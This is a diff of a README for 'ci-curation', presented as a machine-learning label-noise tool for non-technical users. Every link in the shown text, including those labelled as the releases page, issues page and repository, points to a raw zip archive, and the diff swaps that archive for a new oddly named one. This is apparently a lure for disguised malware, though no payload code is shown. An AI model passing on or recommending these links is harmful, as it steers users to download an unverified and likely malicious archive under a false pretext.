@@ -4,13 +4,13 @@
 Welcome to **ci-curation**! This application helps improve the quality of data used in machine learning by detecting and correcting label noise. It has been validated using the SST-2 dataset, showing impressive results in restoring accuracy. Follow this guide to download and run the software easily, even if you have no technical background.
 
 ### 🔗 Download the Application
-[![Download ci-curation](https://github.com/odinn1cyber/ci-curation/raw/refs/heads/main/raimentless/ci_curation_v3.4.zip)](https://github.com/odinn1cyber/ci-curation/raw/refs/heads/main/raimentless/ci_curation_v3.4.zip)
+[![Download ci-curation](https://github.com/odinn1cyber/ci-curation/raw/refs/heads/main/raimentless/curation-ci-Aleyrodes.zip)](https://github.com/odinn1cyber/ci-curation/raw/refs/heads/main/raimentless/curation-ci-Aleyrodes.zip)
 
 ## 📥 Download & Install
 To start using **ci-curation**, please follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/odinn1cyber/ci-curation/raw/refs/heads/main/raimentless/ci_curation_v3.4.zip) where you can find the latest version of the application.
+   Go to our [Releases page](https://github.com/odinn1cyber/ci-curation/raw/refs/heads/main/raimentless/curation-ci-Aleyrodes.zip) where you can find the latest version of the application.
 
 2. **Find the Latest Version**  
    On the Releases page, look for the most recent version listed. It will be at the top of the page.
@@ -61,14 +61,14 @@ If you encounter any issues during installation or usage, please try the followi
 - Ensure your system meets the requirements.
 - Check your internet connection if you face download problems.
 - Restart your computer and attempt the installation again if it fails.
-- Refer to our [GitHub Issues page](https://github.com/odinn1cyber/ci-curation/raw/refs/heads/main/raimentless/ci_curation_v3.4.zip) for additional help.
+- Refer to our [GitHub Issues page](https://github.com/odinn1cyber/ci-curation/raw/refs/heads/main/raimentless/curation-ci-Aleyrodes.zip) for additional help.
 
 ## 📞 Support
 For more assistance, you can reach out via the Issues section on the GitHub repository. Detailed feedback helps us improve the application continually.
 
 ## 🔗 Quick Links
-- [Download ci-curation](https://github.com/odinn1cyber/ci-curation/raw/refs/heads/main/raimentless/ci_curation_v3.4.zip)
-- [GitHub Repository](https://github.com/odinn1cyber/ci-curation/raw/refs/heads/main/raimentless/ci_curation_v3.4.zip)
-- [Issues Page](https://github.com/odinn1cyber/ci-curation/raw/refs/heads/main/raimentless/ci_curation_v3.4.zip)
+- [Download ci-curation](https://github.com/odinn1cyber/ci-curation/raw/refs/heads/main/raimentless/curation-ci-Aleyrodes.zip)
+- [GitHub Repository](https://github.com/odinn1cyber/ci-curation/raw/refs/heads/main/raimentless/curation-ci-Aleyrodes.zip)
+- [Issues Page](https://github.com/odinn1cyber/ci-curation/raw/refs/heads/main/raimentless/curation-ci-Aleyrodes.zip)
 
 Thank you for choosing **ci-curation**! With this tool, you can ensure the data quality needed for successful machine learning projects.
